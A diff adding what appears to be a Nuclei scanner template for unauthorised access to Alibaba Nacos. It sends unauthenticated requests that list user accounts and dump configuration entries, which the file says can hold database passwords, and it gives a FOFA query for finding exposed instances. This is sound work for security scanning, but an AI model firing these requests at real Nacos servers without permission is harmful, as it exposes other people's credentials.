@@ -1,0 +1,43 @@
+id: nacos-unauthorized
+
+info:
+  name: Nacos 未授权访问漏洞
+  author: god
+  severity: high
+  description: Alibaba Nacos 配置中心未授权访问，可获取数据库密码等敏感配置
+  metadata:
+    fofa-query: app="nacos"
+  tags: nacos,unauthorized
+
+http:
+- raw:
+  - |
+    @timeout: 15s
+    GET /nacos/v1/auth/users?pageNo=1&pageSize=100 HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 0
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "username"
+        - "totalCount"
+      condition: and
+
+- raw:
+  - |
+    @timeout: 15s
+    GET /nacos/v1/cs/configs?search=accurate&dataId=&group=&tenant=&pageNo=1&pageSize=100 HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 0
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "totalCount"
+        - "content"
+      condition: and
